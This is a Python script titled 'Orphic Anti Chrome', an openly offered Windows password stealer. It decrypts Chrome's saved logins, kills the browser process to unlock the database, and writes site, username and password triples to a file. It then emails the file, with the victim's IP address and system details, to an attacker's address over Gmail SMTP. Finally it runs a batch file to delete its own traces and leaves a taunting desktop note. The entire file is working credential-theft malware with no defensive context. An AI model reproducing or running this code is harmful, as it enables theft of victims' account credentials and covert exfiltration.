#Orphic Anti Chrome.
#Imports
from os import getenv
import sqlite3
import win32crypt
import socket
import smtplib
import os
import psutil
import datetime
import time
import ipgetter
import platform


def __main__():
    #GET system Name
    sysname = socket.gethostname()
    
    #Get Chrome Passwords
    def antiChrome():
        conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") 
        cursor = conn.cursor()
        cursor.execute('Select action_url, username_value, password_value FROM logins')
        passfile = open(sysname+".txt", "w")
        passfile.write("\nChrome Saved Passwords From PC : "+sysname+"\n")
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
            if password:
                passfile.write('\nThe website is '+result[0])
                passfile.write('\nThe Username is '+result[1])
                passfile.write('\n The password is ' + str(password))

    #Check if Chrome exists
    proc = "chrome.exe" in (p.name() for p in psutil.process_iter())
    if(proc == True):
        try:
            #Check if the Passwords file already exists just in case 
            File = open(sysname+".txt", "r")
            msg2 = File.read()
        #If the File does not exist.
        except FileNotFoundError:
            #Kill chrome if it is runnning to avoid Database is Locked Error.
            os.system("taskkill /F /IM chrome.exe /T") 
            #Get Chrome Passwords
            antiChrome()
            #Read it to Email
            File = open(sysname+".txt", "r")
            msg2 = File.read()
        except:
            #Just in case
            antiChrome()
            File = open(sysname+".txt", "r")
            msg2 = File.read()
    else:
        antiChrome()
        File = open(sysname+".txt", "r")
        msg2 = File.read()
    
    #Emails and Passwords
    email = 'youremailgoeshere'
    password = 'yourpasswordgoeshere'
    target = 'Receivers email goes here'
    #Connect to Smtp server Gmail
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.connect('smtp.gmail.com', 587)  
    server.ehlo()
    server.starttls()
    server.ehlo()
    #Login Smtp Server
    server.login(email, password)
    #Create Email Message
    msg1 = "Orphic Anti Chrome Report. Today is :"+ str(datetime.datetime.now())
    #Get system IP
    ip = ipgetter.myip()
    #Full email Message
    msg = msg1 + '\n' + ip + '\n' + platform.machine() + '\n' + platform.version() + '\n' + platform.system() + '\n' + platform.processor() + '\n' + msg2 
    #Send the Mail
    server.sendmail(email, target, msg)

    def selfDestruct():
        #Delete all Traces and leave a Message
        payload = open("HEY.txt", "w")
        payload.write("Orphic WAS HERE! It was nice to meet your Computer.")
        payload.close()
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
        os.system("copy HEY.txt "+desktop)
        bat = open("del.bat", "w")
        bat.write("@echo off\n")
        bat.write("DEL orphic.exe\n")
        bat.write("DEL HEY.txt\n")
        bat.write("DEL "+sysname+".txt\n")
        bat.write("exit")
        bat.close()
        os.system("start del.bat")
    selfDestruct()

if __name__ == '__main__':
    __main__()
